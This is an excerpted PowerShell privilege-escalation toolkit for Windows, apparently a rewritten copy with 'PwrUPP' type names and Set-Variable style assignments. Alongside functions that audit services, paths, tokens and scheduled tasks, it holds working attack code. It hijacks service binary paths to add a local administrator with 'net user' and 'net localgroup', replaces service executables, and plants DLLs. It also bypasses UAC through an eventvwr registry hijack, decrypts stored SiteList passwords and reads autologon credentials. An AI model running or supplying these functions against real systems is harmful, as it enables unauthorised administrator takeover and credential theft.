...
function New-InMemoryModule {
    ...
    Set-Variable -Name AppDomain -Value ([Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @()))
    Set-Variable -Name LoadedAssemblies -Value ($AppDomain.GetAssemblies())
    ...
    Set-Variable -Name DynAssembly -Value (New-Object Reflection.AssemblyName($ModuleName))
    Set-Variable -Name Domain -Value ($AppDomain)
    Set-Variable -Name AssemblyBuilder -Value ($Domain.DefineDynamicAssembly($DynAssembly, 'Run'))
    Set-Variable -Name ModuleBuilder -Value ($AssemblyBuilder.DefineDynamicModule($ModuleName, $False))
...
function func {
    ...
    Set-Variable -Name Properties -Value (@{DllName=$DllName;ReturnType=$ReturnType;FunctionName=$FunctionName;})
...
function Add-Win32Type
{
    ...
    PROCESS
    {
        ...
        else
        {
            ...
            Set-Variable -Name Method -Value ($TypeHash[$DllName].DefineMethod(
                $FunctionName,
            ...
            Set-Variable -Name DllImport -Value ([Runtime.InteropServices.DllImportAttribute])
            Set-Variable -Name SetLastErrorField -Value ($DllImport.GetField('SetLastError'))
            Set-Variable -Name CallingConventionField -Value ($DllImport.GetField('CallingConvention'))
            Set-Variable -Name CharsetField -Value ($DllImport.GetField('CharSet'))
            Set-Variable -Name EntryPointField -Value ($DllImport.GetField('EntryPoint'))
            if ($SetLastError) { $SLEValue = $True } else { Set-Variable -Name SLEValue -Value ($False) }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { Set-Variable -Name ExportedFuncName -Value ($FunctionName) }


            Set-Variable -Name Constructor -Value ([Runtime.InteropServices.DllImportAttribute].GetConstructor([String]))
            Set-Variable -Name DllImportAttribute -Value (New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
    ...
    BEGIN
    {
        Set-Variable -Name TypeHash -Value (@{})
    }
    ...
    END
    {
        ...
        Set-Variable -Name ReturnTypes -Value (@{})

        foreach ($Key in $TypeHash.Keys)
        {
            Set-Variable -Name Type -Value ($TypeHash[$Key].CreateType())
...
function psenum {
    ...
    Set-Variable -Name EnumType -Value ($Type -as [Type])

    Set-Variable -Name EnumBuilder -Value ($Module.DefineEnum($FullName, 'Public', $EnumType))
    ...
    foreach ($Key in $EnumElements.Keys)
    {
        ...
        Set-Variable -Name null -Value ($EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType))
    }
...
function field {
    ...
    @{Position=$Position;Type=$Type -as [Type];Offset=$Offset;MarshalAs=$MarshalAs;}
}
...
function struct
{
    ...
    {
        Set-Variable -Name StructAttributes -Value ($StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout)
    }

    Set-Variable -Name StructBuilder -Value ($Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize))
    Set-Variable -Name ConstructorInfo -Value ([Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0])
    Set-Variable -Name SizeConst -Value (@([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst')))

    Set-Variable -Name Fields -Value (New-Object Hashtable[]($StructFields.Count))
    ...
    {
        Set-Variable -Name Index -Value ($StructFields[$Field]['Position'])
        $Fields[$Index] = @{FieldName=$Field;Properties=$StructFields[$Field];}
    }

    foreach ($Field in $Fields)
    {
        Set-Variable -Name FieldName -Value ($Field['FieldName'])
        Set-Variable -Name FieldProp -Value ($Field['Properties'])

        Set-Variable -Name Offset -Value ($FieldProp['Offset'])
        Set-Variable -Name Type -Value ($FieldProp['Type'])
        Set-Variable -Name MarshalAs -Value ($FieldProp['MarshalAs'])

        Set-Variable -Name NewField -Value ($StructBuilder.DefineField($FieldName, $Type, 'Public'))
    ...
    Set-Variable -Name SizeMethod -Value ($StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @()))
    Set-Variable -Name ILGenerator -Value ($SizeMethod.GetILGenerator())
    ...
    Set-Variable -Name ImplicitConverter -Value ($StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr])))
    Set-Variable -Name ILGenerator2 -Value ($ImplicitConverter.GetILGenerator())
...
function Get-ModifiablePath {
    ...
    [OutputType('PwrUPP.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipelineByPropertyName, Mandatory, Position = 0, ValueFromPipeline)]
        [Alias('FullName')]
        [String[]]
        $Path,
    ...
    BEGIN {
        ...
        Set-Variable -Name AccessMask -Value (@{[uint32]'0x80000000'='GenericRead';[uint32]'0x00000080'='ReadAttributes';[uint32]'0x00000040'='DeleteChild';[uint32]'0x00080000'='WriteOwner';[uint32]'0x00040000'='WriteDAC';[uint32]'0x00000008'='ReadExtendedAttributes';[uint32]'0x20000000'='GenericExecute';[uint32]'0x10000000'='GenericAll';[uint32]'0x00000004'='AppendData/AddSubdirectory';[uint32]'0x40000000'='GenericWrite';[uint32]'0x01000000'='AccessSystemSecurity';[uint32]'0x00010000'='Delete';[uint32]'0x00100000'='Synchronize';[uint32]'0x00000100'='WriteAttributes';[uint32]'0x00000020'='Execute/Traverse';[uint32]'0x00020000'='ReadControl';[uint32]'0x00000010'='WriteExtendedAttributes';[uint32]'0x00000002'='WriteData/AddFile';[uint32]'0x00000001'='ReadData/ListDirectory';[uint32]'0x02000000'='MaximumAllowed';})

        Set-Variable -Name UserIdentity -Value ([Security.Principal.WindowsIdentity]::GetCurrent())
        Set-Variable -Name CurrentUserSids -Value ($UserIdentity.Groups | Select-Object -ExpandProperty Value)
        Set-Variable -Name CurrentUserSids -Value ($CurrentUserSids + ($UserIdentity.User.Value))
        Set-Variable -Name TranslatedIdentityReferences -Value (@{})
    }
    ...
    PROCESS {
        ...
        ForEach($TargetPath in $Path) {
            ...
            Set-Variable -Name CandidatePaths -Value (@())


            Set-Variable -Name SeparationCharacterSets -Value (@('"', "'", ' ', "`"'", '" ', "' ", "`"' "))
                ...
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
                        ...
                        if (($SeparationCharacterSet -notmatch ' ')) {
                            ...
                            Set-Variable -Name CandidatePaths -Value ($CandidatePaths + (Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}))
                        }
                    }
                }
            }
            ...
            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                Set-Variable -Name CandidatePath -Value ($_)
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                    ...
                    Set-Variable -Name FileSystemRights -Value ($_.FileSystemRights.value__)

                    Set-Variable -Name Permissions -Value ($AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] })


                    Set-Variable -Name Comparison -Value (Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent)
                    ...
                    if ($Comparison) {
                        ...
                        if ($CurrentUserSids -contains $IdentitySID) {
                            ...
                            $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ModifiablePath')
                            $Out
                        }
                    }
                }
...
function Get-TokenInformation {
    ...
    [OutputType('PwrUPP.TokenGroup')]
    [OutputType('PwrUPP.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [String[]]
        [ValidateSet('Type', 'Privileges', 'Groups')]
                ...
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    ...
                    if ($TokenGroups.Groups[$i].SID) {
                        ...
                        if ($Result -eq 0) {
                            ...
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PwrUPP.TokenGroup')
                            $GroupSid
                        }
                    }
                }
        ...
        elseif ($InformationClass -eq 'Privileges') {
            ...
            if ($Success) {
                ...
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    ...
                    $Privilege.PSObject.TypeNames.Insert(0, 'PwrUPP.TokenPrivilege')
                    $Privilege
                }
            }
            else {
            ...
            Set-Variable -Name TokenResult -Value (New-Object PSObject)




            Set-Variable -Name TokenTypePtrSize -Value (0)
            Set-Variable -Name Success -Value ($Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [Ref]$TokenTypePtrSize))
            [IntPtr]$TokenTypePtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)

            Set-Variable -Name Success -Value ($Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [System.Management.Automation.PSReference]$TokenTypePtrSize));Set-Variable -Name LastError -Value ([Runtime.InteropServices.Marshal]::GetLastWin32Error())
            ...
            [Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)




            Set-Variable -Name TokenImpersonationLevelPtrSize -Value (0)
            Set-Variable -Name Success -Value ($Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [Ref]$TokenImpersonationLevelPtrSize))
            [IntPtr]$TokenImpersonationLevelPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)

            Set-Variable -Name Success2 -Value ($Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [System.Management.Automation.PSReference]$TokenImpersonationLevelPtrSize));Set-Variable -Name LastError -Value ([Runtime.InteropServices.Marshal]::GetLastWin32Error())
            ...
            if ($Success2) {
                ...
                $TokenResult.PSObject.TypeNames.Insert(0, 'PwrUPP.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}
...
function Get-ProcessTokenGroup {
    ...
    PROCESS {
        if ($PSBoundParameters['Id']) {
            ...
            Set-Variable -Name ProcessHandle -Value ($Kernel32::GetCurrentProcess())
            Set-Variable -Name ProcessID -Value ($PID)
        }
...
function Get-ProcessTokenPrivilege {
    ...
    Param(
        ...
        [Parameter(ValueFromPipelineByPropertyName, Position = 0, ValueFromPipeline)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    ...
    BEGIN {
        Set-Variable -Name SpecialPrivileges -Value (@('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege'))
    }
}
...
function Enable-Privilege {
    ...
    PROCESS {
        ForEach ($Priv in $Privilege) {
            ...
            Set-Variable -Name Success -Value ($NTDll::RtlAdjustPrivilege($SecurityEntity::$Priv, $True, $False, [Management.Automation.PSReference]$PreviousState))
            if ($Success -ne 0) {
...
function Add-ServiceDacl {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            Set-Variable -Name IndividualService -Value (Get-Service -Name $ServiceName -ErrorAction Stop)

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                Set-Variable -Name ServiceHandle -Value (Get-ServiceReadControlHandle -Service $IndividualService)
            }
            catch {
                Set-Variable -Name ServiceHandle -Value ($Null)
...
function Set-ServiceBinaryPath {
    ...
    Param(
        ...
        [Parameter(ValueFromPipelineByPropertyName, Position = 0, Mandatory, ValueFromPipeline)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            Set-Variable -Name TargetService -Value (Get-Service -ErrorAction Stop -Name $IndividualService)
            try {
                Set-Variable -Name ServiceHandle -Value (Get-ServiceConfigControlHandle -TargetService $TargetService)
            }
            catch {
                Set-Variable -Name ServiceHandle -Value ($Null)
...
function Test-ServiceDaclPermission {
    ...
    Param(
        [String[]]
        [ValidateSet('GenericRead', 'WriteOwner', 'PauseContinue', 'GenericAll', 'AccessSystemSecurity', 'AllAccess', 'Interrogate', 'EnumerateDependents', 'Delete', 'Synchronize', 'ReadControl', 'WriteDac', 'Start', 'QueryConfig', 'ChangeConfig', 'UserDefinedControl', 'Stop', 'QueryStatus', 'GenericWrite', 'GenericExecute')]
        $Permissions,
        ...
        [String]
        [ValidateSet('AllAccess', 'Restart', 'ChangeConfig')]
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            Set-Variable -Name TargetService -Value ($IndividualService | Add-ServiceDacl)
    ...
    BEGIN {
        Set-Variable -Name AccessMask -Value (@{'Delete'=[uint32]'0x00010000';'AllAccess'=[uint32]'0x000F01FF';'Synchronize'=[uint32]'0x00100000';'WriteDac'=[uint32]'0x00040000';'QueryStatus'=[uint32]'0x00000004';'AccessSystemSecurity'=[uint32]'0x01000000';'GenericRead'=[uint32]'0x80000000';'GenericAll'=[uint32]'0x10000000';'GenericExecute'=[uint32]'0x20000000';'ChangeConfig'=[uint32]'0x00000002';'GenericWrite'=[uint32]'0x40000000';'Stop'=[uint32]'0x00000020';'EnumerateDependents'=[uint32]'0x00000008';'QueryConfig'=[uint32]'0x00000001';'Start'=[uint32]'0x00000010';'ReadControl'=[uint32]'0x00020000';'Interrogate'=[uint32]'0x00000080';'PauseContinue'=[uint32]'0x00000040';'WriteOwner'=[uint32]'0x00080000';'UserDefinedControl'=[uint32]'0x00000100';})

        Set-Variable -Name CheckAllPermissionsInSet -Value ($False)
...
function Get-UnquotedService {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.UnquotedService')]
    [CmdletBinding()]
    Param()
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                ...
                $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.UnquotedService')
                $Out
            }
        }
    }
...
function Get-ModifiableServiceFile {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.ModifiableServiceFile')]
    [CmdletBinding()]
    Param()
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | Get-ModifiablePath | ForEach-Object {
            ...
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
            $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ModifiableServiceFile')
            $Out
        }
    }
}
...
function Get-ModifiableService {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.ModifiableService')]
    [CmdletBinding()]
    Param()
    ...
    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
        ...
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
        $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ModifiableService')
        $Out
    }
}
...
function Invoke-ServiceAbuse {
    ...
    [OutputType('PwrUPP.AbusedService')]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ...
        [Parameter(Position = 0, ValueFromPipeline, Mandatory, ValueFromPipelineByPropertyName)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            Set-Variable -Name TargetService -Value (Get-Service -ErrorAction Stop -Name $IndividualService)
            Set-Variable -Name ServiceDetails -Value ($TargetService | Get-ServiceDetail)

            Set-Variable -Name RestoreDisabled -Value ($False)
            ...
            Set-Variable -Name OriginalServicePath -Value ($ServiceDetails.PathName)
            Set-Variable -Name OriginalServiceState -Value ($ServiceDetails.State)
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                Set-Variable -Name Success -Value ($TargetService | Set-ServiceBinaryPath -Path "$ServiceCommand")
            ...
            Set-Variable -Name Success -Value ($TargetService | Set-ServiceBinaryPath -Path "$OriginalServicePath")
    ...
    BEGIN {
        ...
        if ($PSBoundParameters['Command']) {
            ...
            if ($PSBoundParameters['Credential']) {
                ...
                Set-Variable -Name UserNameToAdd -Value ($UserName)
                Set-Variable -Name PasswordToAdd -Value ($Password)
            }
            ...
            if ($UserNameToAdd.Contains('\')) {
                ...
                Set-Variable -Name ServiceCommands -Value (@("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add"))
            }
        }
    }
}
...
function Write-ServiceBinary {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PwrUPP.ServiceBinary')]
    [CmdletBinding()]
    Param(
        [String]
    ...
    BEGIN {
        ...
        if ($PSBoundParameters['Command']) {
            ...
            if ($UserNameToAdd.Contains('\')) {
                ...
                Set-Variable -Name ServiceCommand -Value ("net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }
}
...
function Install-ServiceBinary {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PwrUPP.ServiceBinary.Installed')]
    [CmdletBinding()]
    Param(
        [String]
        [ValidateNotNullOrEmpty()]
    ...
    PROCESS {
        Set-Variable -Name TargetService -Value (Get-Service -Name $Name -ErrorAction Stop)
        Set-Variable -Name ServiceDetails -Value ($TargetService | Get-ServiceDetail)
        Set-Variable -Name ModifiableFiles -Value ($ServiceDetails.PathName | Get-ModifiablePath -Literal)
        ...
        Set-Variable -Name ServicePath -Value ($ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath)
        Set-Variable -Name BackupPath -Value ("$($ServicePath).bak")

        Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"

        try {
            Copy-Item -Destination $BackupPath -Force -Path $ServicePath
        }
        catch {
            Write-Warning "Error backing up '$ServicePath' : $_"
        }

        Set-Variable -Name Result -Value (Write-ServiceBinary -Path $ServicePath -Name $ServiceDetails.Name -Command $ServiceCommand)
        $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Result.PSObject.TypeNames.Insert(0, 'PwrUPP.ServiceBinary.Installed')
        $Result
    }
...
function Restore-ServiceBinary {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.ServiceBinary.Restored')]
    [CmdletBinding()]
    Param(
    ...
    PROCESS {
        Set-Variable -Name TargetService -Value (Get-Service -ErrorAction Stop -Name $Name)
        Set-Variable -Name ServiceDetails -Value ($TargetService | Get-ServiceDetail)
        Set-Variable -Name ModifiableFiles -Value ($ServiceDetails.PathName | Get-ModifiablePath -Literal)
        ...
        $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ServiceBinary.Restored')
        $Out
    }
}
...
function Find-ProcessDLLHijack {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Switch]
        $ExcludeProgramFiles,
    ...
    PROCESS {
        ...
        ForEach ($ProcessName in $Name) {
            ...
            Set-Variable -Name TargetProcess -Value (Get-Process -Name $ProcessName)
                    ...
                    ForEach ($Module in $LoadedModules){
                        ...
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
                            ...
                            if (-not $Exclude){
                                ...
                                $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
    ...
    BEGIN {
        ...
        Set-Variable -Name Keys -Value (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        Set-Variable -Name KnownDLLs -Value ($(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") })
        Set-Variable -Name KnownDLLPaths -Value ($(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") })
        Set-Variable -Name KnownDLLs -Value ($KnownDLLs + (ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}))
        Set-Variable -Name CurrentUser -Value ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)


        Set-Variable -Name Owners -Value (@{})
...
function Find-PathDLLHijack {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        ...
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                ...
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PwrUPP.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
...
function Write-HijackDll {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PwrUPP.HijackableDLL')]
    [CmdletBinding()]
    Param(
        [String]
        [ValidateSet('x64', 'x86')]
    ...
    function local:Invoke-PatchDll {
        ...
        Set-Variable -Name ReplaceStringBytes -Value (([System.Text.Encoding]::UTF8).GetBytes($ReplaceString))

        Set-Variable -Name Index -Value (0)
        Set-Variable -Name S -Value ([System.Text.Encoding]::ASCII.GetString($DllBytes))
        Set-Variable -Name Index -Value ($S.IndexOf($SearchString))

        if ($Index -eq 0) {
            throw("Could not find string $SearchString !")
        }

        for (Set-Variable -Name i -Value (0); $i -lt $ReplaceStringBytes.Length; $i++) {
    ...
    elseif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        ...
        Set-Variable -Name TargetArchitecture -Value ('x86')
    }
    ...
    if ($PSBoundParameters['BatPath']) {
        ...
        Set-Variable -Name BasePath -Value ($DllPath | Split-Path -Parent)
        Set-Variable -Name TargetBatPath -Value ("$BasePath\debug.bat")
    }


    Set-Variable -Name DllBytes -Value (Invoke-PatchDll -SearchString 'debug.bat' -ReplaceString $TargetBatPath -DllBytes $DllBytes)
    ...
    Set-Content -Path $DllPath -Encoding Byte -Value $DllBytes
    ...
    $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.HijackableDLL')
    $Out
}
...
function Get-RegistryAutoLogon {
    ...
    [OutputType('PwrUPP.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()
    ...
    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
        ...
        if ($DefaultUserName -or $AltDefaultUserName) {
            ...
            $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.RegistryAutoLogon')
            $Out
        }
    }
}
...
function Get-ModifiableRegistryAutoRun {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()
    ...
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        ...
        ForEach ($Name in $Keys.GetValueNames()) {
            ...
            $Path | Get-ModifiablePath | ForEach-Object {
                ...
                $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }
...
function Get-ModifiableScheduledTaskFile {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()
        ...
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    ...
                    $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.ModifiableScheduledTaskFile')
                    $Out
                }
...
function Get-UnattendedInstallFile {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()
    ...
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        ...
        $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.UnattendedInstallFile')
        $Out
    }
...
function Get-SiteListPassword {
    ...
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PwrUPP.SiteListPassword')]
    [CmdletBinding()]
    Param(
    ...
    PROCESS {
        if ($PSBoundParameters['Path']) {
            ...
            Set-Variable -Name XmlFilePaths -Value (@('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\'))
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Include 'SiteList.xml' -ErrorAction SilentlyContinue -Recurse } | Where-Object { $_ } | Foreach-Object {
    ...
    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            ...
            Set-Variable -Name Encoding -Value ([Text.Encoding]::ASCII)
            Set-Variable -Name SHA1 -Value (New-Object System.Security.Cryptography.SHA1CryptoServiceProvider)
            Set-Variable -Name 3DES -Value (New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider)


            Set-Variable -Name XORKey -Value (0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19)


            Set-Variable -Name I -Value (0);
            Set-Variable -Name UnXored -Value ([System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] })


            Set-Variable -Name 3DESKey -Value ($SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4)
            ...
            Set-Variable -Name Decrypted -Value ($3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length))


            Set-Variable -Name Index -Value ([Array]::IndexOf($Decrypted, [Byte]0))
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                Set-Variable -Name DecryptedPass -Value ($Encoding.GetString($Decrypted))
            }

            New-Object -TypeName PSObject -Property @{'Decrypted'=$DecryptedPass;'Encrypted'=$B64Pass;}
        }
        ...
        function Local:Get-SitelistField {
            ...
            try {
                [Xml.XmlDocument]$SiteListXml = Get-Content -Path $Path
                ...
                if ($SiteListXml.InnerXml -Like "*password*") {
                    ...
                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            ...
                            $Out.PSObject.TypeNames.Insert(0, 'PwrUPP.SiteListPassword')
                            $Out
                        }
                        catch {
...
function Invoke-EventVwrBypass {
    ...
    Set-Variable -Name ConsentPrompt -Value ((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin)
    Set-Variable -Name SecureDesktopPrompt -Value ((Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop)
    ...
    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        ...
        Set-Variable -Name mscCommandPath -Value ("HKCU:\Software\Classes\mscfile\shell\open\command")
        Set-Variable -Name Command -Value ($pshome + '\' + $Command)
        ...
        Set-Variable -Name EventvwrPath -Value (Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe')
        ...
        Set-Variable -Name mscfilePath -Value ("HKCU:\Software\Classes\mscfile")
...
function Invoke-PrivescAudit {
    ...
    if ($Format -eq 'HTML') {
        ...
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PwrUPP report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    Write-Verbose "Running Invoke-PrivescAudit"

    Set-Variable -Name Checks -Value (@(

        @{Command={ if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } };Type='User Has Local Admin Privileges';},
        @{AbuseScript={ 'Invoke-WScriptUACBypass -Command "..."' };Type='User In Local Group with Admin Privileges';Command={ if ((Get-ProcessTokenGroup | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } };},
        @{Command={ Get-ProcessTokenPrivilege -Special | Where-Object {$_} };Type='Process Token Privileges';},

        @{Type='Unquoted Service Paths';Command={ Get-UnquotedService };},
        @{Command={ Get-ModifiableServiceFile };Type='Modifiable Service Files';},
        @{Type='Modifiable Services';Command={ Get-ModifiableService };},

        @{Command={ Find-PathDLLHijack };Type='%PATH% .dll Hijacks';AbuseScript={ "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" };},

